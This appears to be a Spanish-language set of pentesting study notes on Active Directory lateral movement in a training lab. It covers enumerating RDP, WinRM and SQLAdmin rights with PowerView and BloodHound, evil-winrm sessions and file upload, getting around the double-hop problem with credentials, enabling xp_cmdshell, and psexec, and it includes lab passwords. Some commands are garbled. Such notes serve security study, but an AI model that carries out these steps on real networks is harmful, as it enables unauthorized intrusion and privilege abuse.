#rdp #mssql #winrm
Nos planteamos este escenario cuando somos un usuario sin privilegios administrativos locales o de dominio. Aún podemos tratar de movernos entre distintos hosts. Bloodhound nos permite comprobar escenarios del tipo 
- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)
## RDP
### Enumerando usuarios y equipos del grupo RDesktop 
#### Comprobando usuarios que tienen acceso vía rdp a un equipo 
- Con Powershell `Get-NetLocalGroupMember`
	```powershell
	Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
	```
- Con `bloodound` 
	- Seleccionamos el nodo
	- Buscamos inbound execution rights (derechos de ejecución entrante)
	- Opciones RDP
#### Buscando equipos que permitan RDP 
- PowerView (No comprobado)
	```powershell
	$computers = Get-NetComputer -FullData | Select-Object dnshostname 
	foreach ($computer in $computers) { Get-NetLocalGroupMember -ComputerName $computer.dnshostname -GroupName "Remote Desktop Users" }
	```
- Bloodhound
	```cypher
	match p=(g:Group)-[:CanRDP]->(c:Computer)  where g.name STARTS WITH 'DOMAIN USERS'  AND c.operatingsystem CONTAINS 'Server'  return p
	```
## WinRM
### Enumerando usuarios del grupo Remote Managment
- **Con powerview** `Get-NetLocalGroupMember`
    ```powershell
     Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
    ```
    
- Con query personalizada en bloodhound
    ```
    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p
    ```
### Estableciendo sesión
- Windows
	```powershell
		$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -ForcePS $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password) 
		Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
	```
-  Para subir/descargar archivos en una sesión `evil-winrm`
	- Subir archivos
		```powershell
		upload /home/user/scripts/exploit.ps1 C:\Users\Administrador\Desktop\exploit.ps1
		```
	- Descargar archivos
		```
		download C:\ruta\archivo.txt /ruta/local/archivo.txt
		```
- Linux
	```bash
	evil-winrm -i $target -u <username>
	```


### Estableciendo sesión - problema del double Hop
Dado que en WinRM obteenmos un ticket TGS, no podemos ejecutar algunos comandos que involucran comunicarse con otros hosts. Ejemplo:
```powershell
#Comando desde la máquina atacante para establecer powershell remoting (OK)
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm
# El comando a continuación ejecuta una solicitud LDAP o Kerberos a DC01 (Falla)
Get-DomainUser -SPN
```
#### Solución 1: **PSCredential Object**

Una posible solución es envíar nuevamente nuestras credenciales
```powershell
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\backupadm', $SecPassword)
```

Ahora, si intentamos ejecutar comandos que involucren servicios con autenticación delegada e incluimos la flag `-credenti-Credentialal $Cred` , podremos acceder a estos servicios:
```powershell
get-domainuser -spn -credential $Cred | select samaccountname
```

#### Solución 2: **Register PSSession Configuration**

Otra solución es que en la sesión de autenticación se pasen, además de las credenciales de `backupadm` para que siempre se ejecuten los comandos con las credenciales de este usuario.
```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\\backupadm
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm -ConfigurationName  backupadmsess
```

## SQL Server
### Enumerando usuarios con derechos de administrador en SQL
- Query personalizada de Bloodhound
	```cypher
	MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
	```
### PowerUpSQ,1443
- [Chuleta interesante](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
- Enumerando instancias de MSSQL    
    ```powershell
    cd .\\PowerUpSQL\\
    Import-Module .\\PowerUpSQL.ps1
    Get-SQLInstanceDomain
    ```
- Autenticando sobre una instancia MSSQL (Windows)
    ```powershell
    Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\\damundsen" -password "SQL1234!" -query 'Select @@version'
    ```
- Autenticando sobre una instancia MSSQL - Linux
    ```bash
    #Con credenciales Windows
    mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth 
    #Con credenciales mssql
    mssqlclient.py INLANEFREIGHT/netdb@172.16.7.60
    ```
- Una vez autenticados
	- Seleccionando  **enable_xp_cmdshell**
	    ```bash
	    SQL> enable_xp_cmdshell
	    ```

	- Ejecutando comandos a nivel de sistema
	    ```bash
	    xp_cmdshell whoami /priv
	    ```

## Obtener PS como otro usuario - Windows
### Runas
```powershell
tpetty
```
### psexec
- Ejecutar ps como otro usuario
	```powershell
	psexec.exe -u DOMAIN\Username -p Password powershell.exe
	```

